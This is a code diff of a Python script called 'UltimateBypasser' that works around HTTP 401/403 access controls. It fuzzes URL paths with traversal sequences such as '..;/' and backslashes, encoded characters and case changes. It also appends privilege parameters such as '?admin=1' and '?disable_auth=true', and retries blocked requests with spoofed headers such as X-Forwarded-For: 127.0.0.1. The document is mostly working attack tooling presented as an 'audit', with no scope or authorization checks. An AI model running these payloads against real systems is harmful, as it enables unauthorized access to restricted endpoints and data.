@@ -1,10 +1,18 @@
 import requests
 import argparse
 import sys
+import signal
 from urllib.parse import urlparse
 
-# Disable SSL warnings for research/testing environments
+# Disable SSL warnings
 requests.packages.urllib3.disable_warnings()
+
+# Signal Handler for immediate Ctrl+C exit
+def signal_handler(sig, frame):
+    print("\n\n[!] User interrupted. Shutting down cleanly...")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 class UltimateBypasser:
     def __init__(self, target_url):
@@ -17,7 +25,7 @@ class UltimateBypasser:
         self.session.verify = False
 
     def get_path_variations(self):
-        """Generates all recursive segment injections and dynamic encodings."""
+        """Generates all recursive junction injections, version fuzzing, and encoding."""
         path_str = self.path.strip('/')
         segments = path_str.split('/')
         v = set()
@@ -25,42 +33,62 @@ class UltimateBypasser:
         full_path = "/" + path_str
         v.add(full_path)
 
-        # 1. RECURSIVE SEGMENT INJECTION (e.g., /api/..;/v1/users)
-        # This handles the specific regex you provided (..;/ at every junction)
-        bypass_chars = ["..;/", "..;", ".;/", "./", "//", "/./", "/%2e/"]
+        # 1. API VERSION FUZZING
+        version_payloads = ["v1", "v2", "v3", "v0", "v1.0", "v1.1", "api/v1", "api/v2"]
+        for i, seg in enumerate(segments):
+            if any(x in seg.lower() for x in ['v1', 'v2', 'v3']):
+                for vp in version_payloads:
+                    temp_segs = segments.copy()
+                    temp_segs[i] = vp
+                    v.add("/" + "/".join(temp_segs))
+
+        # 2. RECURSIVE JUNCTION INJECTION (Includes \, .., and ; variations)
+        # These exploit Parser Discrepancies between Proxies and Backends
+        payloads = [
+            "..;/", "..;", ".;/", "./", "//", "/./", "/%2e/", 
+            "\\", "..\\", ".\\", "..\\/", "..;\\"
+        ]
         for i in range(len(segments) + 1):
-            for char in bypass_chars:
+            for p in payloads:
                 temp_segs = segments.copy()
-                temp_segs.insert(i, char)
-                # Fixes potential triple slashes to maintain valid URI structure
-                joined = ("/" + "/".join(temp_segs)).replace("//", "/").replace("//", "/")
+                temp_segs.insert(i, p)
+                joined = ("/" + "/".join(temp_segs)).replace("//", "/")
                 v.add(joined)
 
-        # 2. DYNAMIC CHARACTER ENCODING (Per-character URL encoding)
+        # 3. DYNAMIC CHARACTER ENCODING (Per-character)
         for i in range(len(full_path)):
             if full_path[i] == '/': continue
             encoded = f"%{ord(full_path[i]):02x}"
             v.add(full_path[:i] + encoded + full_path[i+1:])
 
-        # 3. EXTENSION & TRAILING MUTATIONS
-        v.update([
-            full_path + "/", 
-            full_path + "/.", 
-            full_path + "??", 
-            full_path + "#",
-            full_path + ".json",
-            full_path + ".php",
-            full_path.upper()
-        ])
-        
-        # 4. QUERY PARAMETER DISCREPANCIES
-        for q in ["?method=json", "?debug=true", "?admin=1", "?_method=GET"]:
-            v.add(full_path + q)
+        # 4. START/END CASE MUTATION (e.g., /ApI/V2/VpcS)
+        mutated_segments = []
+        for seg in segments:
+            if len(seg) > 1:
+                mutated_segments.append(seg[0].upper() + seg[1:-1] + seg[-1].upper())
+            else:
+                mutated_segments.append(seg.upper())
+        v.add("/" + "/".join(mutated_segments))
 
+        # 5. EXPANDED QUERY PARAMETER BYPASSES
+        params = [
+            "?debug=true", "?debug=1","debug=yes", "?admin=true", "?admin=1", "?is_admin=true","?user=admin","?verify=false","?format=yaml",
+            "?format=txt", "?extend=true", "#extend", "?public=true", "?is_public=true", "public=1", "is_public=1", "?trace=1", "?trace=true",
+            "?method=json", "?format=json","?output=json" "?_method=GET", "?_method=POST","?_method=PUT","?privilege=admin","?validate=false",
+            "?role=admin", "?env=dev","?env=test","?staging=true", "?bypass=true", "?disable_auth=true", "?show_all=true","?trace=true","?v=1",
+            "?version=1.0", "?api_version=v1", "?admin=1%00", "?debug=true%00", "?id=1%00", "?source=127.0.0.1", "?ip=127.0.0.1", "?local=true",
+        ]
+        for p in params:
+            v.add(full_path + p)
+        
+        # 6. SUFFIX MUTATIONS (Includes trailing \)
+        for s in ["/", "/.", "??", "#", ".json", "\\", ".bak", "~"]:
+            v.add(full_path + s)
+        
         return list(v)
 
     def get_headers(self):
-        """The complete list of 19 bypass/identity headers."""
+        """The 19-header Identity and Proxy spoofing matrix."""
         return [
             {"X-Forwarded-For": "127.0.0.1"},
             {"X-Forwarded-Host": "localhost"},
@@ -69,70 +97,62 @@ class UltimateBypasser:
             {"X-Rewrite-URL": self.path},
             {"X-Remote-IP": "127.0.0.1"},
             {"X-Client-IP": "127.0.0.1"},
-            {"X-ProxyUser-Ip": "127.0.0.1"},
             {"X-Real-IP": "127.0.0.1"},
-            {"True-Client-IP": "127.0.0.1"},
-            {"Cluster-Client-IP": "127.0.0.1"},
             {"X-Custom-IP-Authorization": "127.0.0.1"},
             {"X-Originating-IP": "127.0.0.1"},
             {"X-Forwarded-Proto": "http"},
             {"X-Original-Method": "GET"},
             {"X-HTTP-Method-Override": "GET"},
             {"X-Method-Override": "GET"},
+            {"X-Forwarded-For": "localhost"},
             {"Referer": self.base_url + self.path},
             {"Content-Type": "application/json"}
         ]
 
     def run(self):
-        print(f"[*] Starting Exhaustive Audit: {self.base_url}{self.path}")
-        print(f"{'METHOD':<8} | {'CODE':<5} | {'SIZE':<8} | {'PATH VARIATION'}")
-        print("-" * 95)
-
+        print(f"[*] Starting Final Audit: {self.base_url}{self.path}")
         path_variations = self.get_path_variations()
+        print(f"[*] Testing {len(path_variations)} total variations per method.")
+        print("-" * 100)
+
         headers_to_test = self.get_headers()
 
         for method in self.methods:
             for p_var in path_variations:
                 full_url = self.base_url + p_var
                 try:
-                    # Baseline Request (Check the path alone first)
-                    res = self.session.request(method, full_url, timeout=5, allow_redirects=False)
-                    base_status = res.status_code
-                    base_size = len(res.content)
+                    # Baseline Check
+                    res = self.session.request(method, full_url, timeout=3, allow_redirects=False)
+                    print(f"{method:<8} | {res.status_code:<5} | {len(res.content):<8} | {p_var}")
                     
-                    print(f"{method:<8} | {base_status:<5} | {base_size:<8} | {p_var}")
-                    
-                    if base_status in [200, 201, 204]:
-                        self.successes.append(f"Method: {method} | Path: {p_var} (Direct Success)")
+                    if res.status_code in [200, 201]:
+                        self.successes.append(f"SUCCESS: {method} {p_var}")
 
-                    # Trigger Header Fuzzing only if blocked
-                    if base_status in [401, 403, 405]:
+                    # Header Attack if Blocked
+                    if res.status_code in [401, 403, 405]:
                         for h in headers_to_test:
-                            h_res = self.session.request(method, full_url, headers=h, timeout=5, allow_redirects=False)
-                            
-                            # If the header successfully changes the response to 200 OK
-                            if h_res.status_code in [200, 201, 204]:
+                            h_res = self.session.request(method, full_url, headers=h, timeout=2, allow_redirects=False)
+                            if h_res.status_code in [200, 201]:
                                 h_name = list(h.keys())[0]
-                                print(f"  [!] BYPASS FOUND via {h_name}: {h[h_name]}")
-                                self.successes.append(f"Method: {method} | Path: {p_var} | Header: {h}")
-                except Exception:
+                                print(f"  [!] HEADER BYPASS: {h_name} on {p_var}")
+                                self.successes.append(f"HEADER BYPASS: {p_var} via {h_name}")
+                except requests.exceptions.RequestException:
                     continue
 
     def print_summary(self):
-        print("\n" + "="*70)
-        print("                   FINAL AUDIT REPORT")
-        print("="*70)
+        print("\n" + "="*80)
+        print("                         FINAL SUCCESS REPORT")
+        print("="*80)
         if not self.successes:
-            print("[-] No bypasses identified. Target security is robust.")
+            print("[-] No bypasses found. Access is properly restricted.")
         else:
-            # deduplicate results
             for report in sorted(set(self.successes)):
                 print(f"[+] {report}")
-        print("="*70)
+        print("="*80)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Master-Grade 403/401 Auditor")
-    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/api/v1/users)")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", required=True)
     args = parser.parse_args()
 
     auditor = UltimateBypasser(args.url)
